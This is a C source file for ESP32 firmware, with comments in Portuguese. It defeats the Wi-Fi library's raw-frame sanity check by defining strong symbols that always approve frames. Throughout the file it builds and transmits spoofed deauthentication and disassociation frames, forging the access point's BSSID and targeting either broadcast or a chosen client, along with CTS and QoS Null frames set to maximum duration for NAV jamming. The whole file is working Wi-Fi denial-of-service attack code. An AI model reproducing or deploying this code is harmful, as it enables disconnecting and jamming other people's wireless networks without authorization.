/**
 * @file wsl_bypasser.c
 * @brief Wi-Fi Stack Libraries bypasser para arduino-esp32 3.x / IDF 5.x
 *
 * ─── COMO O BYPASS FUNCIONA ────────────────────────────────────────────────
 *
 * O esp_wifi_80211_tx() internamente chama ieee80211_raw_frame_sanity_check()
 * antes de transmitir. Essa função, presente no blob libnet80211.a, rejeita
 * management frames de subtipos 0xC0 (deauth) e 0xA0 (disassoc) com source
 * address diferente do MAC da interface.
 *
 * Mecanismo de override (funciona no linker sem precisar de patch binário):
 *
 *   1. O script `patch_libnet.sh` roda xtensa-esp32-elf-objcopy com
 *      --weaken-symbol=ieee80211_raw_frame_sanity_check na libnet80211.a.
 *      Isso torna o símbolo "weak" no arquivo objeto.
 *
 *   2. Este arquivo define a mesma função como símbolo FORTE que retorna 0.
 *      O linker prefere sempre o símbolo forte — portanto usa esta versão.
 *
 *   3. Com sanity check retornando 0 (= OK), o frame passa direto para
 *      ieee80211_freedom_output → driver → hardware.
 *
 * Fallback sem script: em algumas versões do IDF 5.x, usar WIFI_IF_AP com
 * o WiFi em modo APSTA já permite passar frames sem o sanity check ativo.
 * A função tenta WIFI_IF_AP primeiro e cai para WIFI_IF_STA no erro.
 *
 * ─── REFERÊNCIAS ───────────────────────────────────────────────────────────
 *   - github.com/risinek/esp32-wifi-penetration-tool
 *   - github.com/Jeija/esp32free80211
 *   - gist.github.com/camdenmoors (objcopy weaken-symbol trick)
 *   - github.com/AnvilBrain/esp32-c5-dualband-deauther (patch binário C5)
 */

#include "wsl_bypasser.h"

#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_task_wdt.h"

static const char *TAG = "wsl_bypasser";
static bool bypasser_initialized = false;

/* ─────────────────────────────────────────────────────────────────────────
 * SYMBOL OVERRIDE
 * ieee80211_raw_frame_sanity_check é definida em libnet80211.a (blob).
 * Ao ser marcada como "weak" via objcopy, o linker prefere esta versão forte.
 * Retornar 0 = frame aprovado, qualquer outro valor = frame descartado.
 * ───────────────────────────────────────────────────────────────────────── */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0;  /* sempre aprova — bypass completo */
}

/**
 * ieee80211_is_tx_allowed — segunda barreira de filtragem de frames.
 * Verifica se o tipo de frame (management, control, data) pode ser transmitido.
 * Por padrão, pode bloquear frames de controle (CTS, RTS) em raw TX.
 * Override retorna 1 (permitido) para todos os frame types.
 */
int ieee80211_is_tx_allowed(void) {
    return 1;  /* sempre permite TX — bypass de control frames */
}

/* ─────────────────────────────────────────────────────────────────────────
 * TEMPLATES DE FRAME 802.11
 * ───────────────────────────────────────────────────────────────────────── */

/**
 * Frame de Deautenticação (0xC0)
 * [0-1]   Frame Control: 0xC0 0x00 (Management, Subtype=12 Deauth)
 * [2-3]   Duration
 * [4-9]   Addr1 DST  → preenchido em runtime
 * [10-15] Addr2 SRC  → preenchido em runtime (BSSID forjado)
 * [16-21] Addr3 BSSID→ preenchido em runtime
 * [22-23] Sequence Control
 * [24-25] Reason Code: 0x02 = PREV_AUTH_INVALID
 */
static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00,                         /* Frame Control  */
    0x3a, 0x01,                         /* Duration       */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* Addr1 DST (broadcast) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2 SRC      */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3 BSSID    */
    0xf0, 0xff,                         /* Seq Control    */
    0x02, 0x00                          /* Reason Code    */
};

/**
 * Frame de Disassociation (0xA0)
 * Igual ao deauth, só muda Frame Control
 * Reason Code: 0x08 = DISASSOC_STA_HAS_LEFT
 */
static const uint8_t disassoc_frame_template[] = {
    0xa0, 0x00,                         /* Frame Control  */
    0x3a, 0x01,                         /* Duration       */
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, /* Addr1 DST (broadcast) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2 SRC      */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3 BSSID    */
    0xf0, 0xff,                         /* Seq Control    */
    0x08, 0x00                          /* Reason Code    */
};

/**
 * Frame CTS (Clear-To-Send) para NAV jamming.
 * CTS é control frame (type=1, subtype=12): todos os chipsets WiFi DEVEM
 * honrar o campo Duration/IDS e setar NAV ao receber um CTS válido.
 * Estrutura: FC(2) + Duration(2) + RA(6) = 10 bytes.
 * FCS (4 bytes) é adicionado automaticamente pelo hardware.
 */
static const uint8_t cts_frame_template[] = {
    0xc4, 0x00,                         /* Frame Control: CTS (Control, subtype 12) */
    0xff, 0x7f,                         /* Duration: 32767 us (Max NAV) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* RA: preenchido em runtime */
};

/**
 * Fallback: QoS Null Data com Duration máximo para NAV jamming.
 * Usado quando CTS não pode ser transmitido via esp_wifi_80211_tx.
 * Frame Control 0xC8,0x00: To DS=0, From DS=0 → Addr1=DA(broadcast),
 * Addr2=SA, Addr3=BSSID — combinação válida para broadcast.
 */
static const uint8_t qos_null_frame_template[] = {
    0xc8, 0x00,                         /* Frame Control: QoS Null Data */
    0xff, 0x7f,                         /* Duration: 32767 us (Max NAV) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr1: DA (broadcast) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2: SA (preenchido em runtime) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3: BSSID (preenchido em runtime) */
    0xf0, 0xff,                         /* Seq Control */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  /* QoS Control + padding */
};

/* ─────────────────────────────────────────────────────────────────────────
 * FUNÇÕES INTERNAS
 * ───────────────────────────────────────────────────────────────────────── */

/**
 * Tenta transmitir via WIFI_IF_AP primeiro (funciona sem patch em algumas
 * versões do IDF 5.x), e faz fallback para WIFI_IF_STA se falhar.
 */
static esp_err_t _tx_with_fallback(const uint8_t *buf, int len) {
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
    if (ret == ESP_OK) {
        ESP_LOGD(TAG, "TX OK via WIFI_IF_AP (%d bytes)", len);
        return ESP_OK;
    }
    ESP_LOGW(TAG, "WIFI_IF_AP falhou (0x%x), tentando WIFI_IF_STA", ret);
    ret = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
    if (ret == ESP_OK) {
        ESP_LOGD(TAG, "TX OK via WIFI_IF_STA (%d bytes)", len);
    } else {
        ESP_LOGE(TAG, "TX falhou em ambas interfaces: 0x%x", ret);
    }
    return ret;
}

/* ─────────────────────────────────────────────────────────────────────────
 * API PÚBLICA
 * ───────────────────────────────────────────────────────────────────────── */

void wsl_bypasser_init(void) {
    ESP_LOGI(TAG, "WSL Bypasser inicializado (symbol override ativo)");
    bypasser_initialized = true;
}

void wsl_bypasser_deinit(void) {
    ESP_LOGI(TAG, "WSL Bypasser desativado");
    bypasser_initialized = false;
}

bool wsl_bypasser_is_active(void) {
    return bypasser_initialized;
}

int wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    if (!bypasser_initialized) {
        ESP_LOGW(TAG, "Bypasser não inicializado");
        return ESP_ERR_INVALID_STATE;
    }
    if (!frame_buffer || size <= 0) {
        return ESP_ERR_INVALID_ARG;
    }

    esp_err_t ret = _tx_with_fallback(frame_buffer, size);
    if (ret != ESP_OK) {
        ESP_LOGD(TAG, "Falha ao enviar frame raw: 0x%x", ret);
    }
    return ret;
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record) {
    if (!ap_record) return;

    uint8_t frame[sizeof(deauth_frame_template)];
    memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));

    /* DST = broadcast (já está no template) */
    /* SRC = BSSID do AP (forjado) */
    memcpy(&frame[10], ap_record->bssid, 6);
    /* BSSID = BSSID do AP */
    memcpy(&frame[16], ap_record->bssid, 6);

    ESP_LOGD(TAG, "Deauth broadcast → AP %02x:%02x:%02x:%02x:%02x:%02x CH%d",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5],
             ap_record->primary);

    _tx_with_fallback(frame, sizeof(frame));
}

void wsl_bypasser_send_deauth_frame_unicast(const wifi_ap_record_t *ap_record,
                                            const uint8_t *client_mac) {
    if (!ap_record || !client_mac) return;

    uint8_t frame[sizeof(deauth_frame_template)];
    memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));

    /* DST = MAC do cliente específico */
    memcpy(&frame[4],  client_mac,      6);
    /* SRC = BSSID do AP (forjado) */
    memcpy(&frame[10], ap_record->bssid, 6);
    /* BSSID = BSSID do AP */
    memcpy(&frame[16], ap_record->bssid, 6);

    ESP_LOGD(TAG, "Deauth unicast → cliente %02x:%02x:%02x:%02x:%02x:%02x",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);

    _tx_with_fallback(frame, sizeof(frame));
}

void wsl_bypasser_send_disassoc_frame(const wifi_ap_record_t *ap_record) {
    if (!ap_record) return;

    uint8_t frame[sizeof(disassoc_frame_template)];
    memcpy(frame, disassoc_frame_template, sizeof(disassoc_frame_template));

    memcpy(&frame[10], ap_record->bssid, 6);
    memcpy(&frame[16], ap_record->bssid, 6);

    ESP_LOGD(TAG, "Disassoc broadcast → AP %02x:%02x:%02x:%02x:%02x:%02x",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    _tx_with_fallback(frame, sizeof(frame));
}

esp_err_t wsl_bypasser_send_cts_frame(const uint8_t *target_mac) {
    if (!target_mac) return ESP_ERR_INVALID_ARG;

    /* ── Tentativa 1: CTS real (control frame) ────────────────────────── */
    /* CTS é o frame correto para NAV jamming — todo chipset WiFi honora     */
    /* o Duration field de frames de controle. Estrutura: 10 bytes.         */
    uint8_t cts_frame[sizeof(cts_frame_template)];
    memcpy(cts_frame, cts_frame_template, sizeof(cts_frame_template));
    /* RA = broadcast para todos ouvirem e setarem NAV */
    memset(&cts_frame[4], 0xff, 6);

    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, cts_frame, sizeof(cts_frame), false);
    if (ret == ESP_OK) {
        return ESP_OK;
    }
    /* Fallback: tentar via STA */
    ret = esp_wifi_80211_tx(WIFI_IF_STA, cts_frame, sizeof(cts_frame), false);
    if (ret == ESP_OK) {
        return ESP_OK;
    }
    ESP_LOGW(TAG, "CTS frame falhou (0x%x), tentando QoS Null Data fallback", ret);

    /* ── Tentativa 2: QoS Null Data (fallback) ────────────────────────── */
    /* Alguns drivers IDF bloqueiam control frames em 80211_tx.              */
    /* QoS Null Data com To DS=0 e broadcast é válido e muitos chipsets     */
    /* honram o Duration field nesse tipo de frame também.                   */
    uint8_t qos_frame[sizeof(qos_null_frame_template)];
    memcpy(qos_frame, qos_null_frame_template, sizeof(qos_null_frame_template));
    /* Addr1 = DA = broadcast */
    memset(&qos_frame[4], 0xff, 6);
    /* Addr2 = SA = MAC da interface */
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, mac);
    memcpy(&qos_frame[10], mac, 6);
    /* Addr3 = BSSID = MAC da interface */
    memcpy(&qos_frame[16], mac, 6);

    ret = esp_wifi_80211_tx(WIFI_IF_AP, qos_frame, sizeof(qos_frame), false);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "QoS Null via AP falhou (0x%x), tentando STA", ret);
        ret = esp_wifi_80211_tx(WIFI_IF_STA, qos_frame, sizeof(qos_frame), false);
        if (ret != ESP_OK) {
            ESP_LOGE(TAG, "NAV frame falhou em todas as tentativas: 0x%x", ret);
        }
    }
    return ret;
}
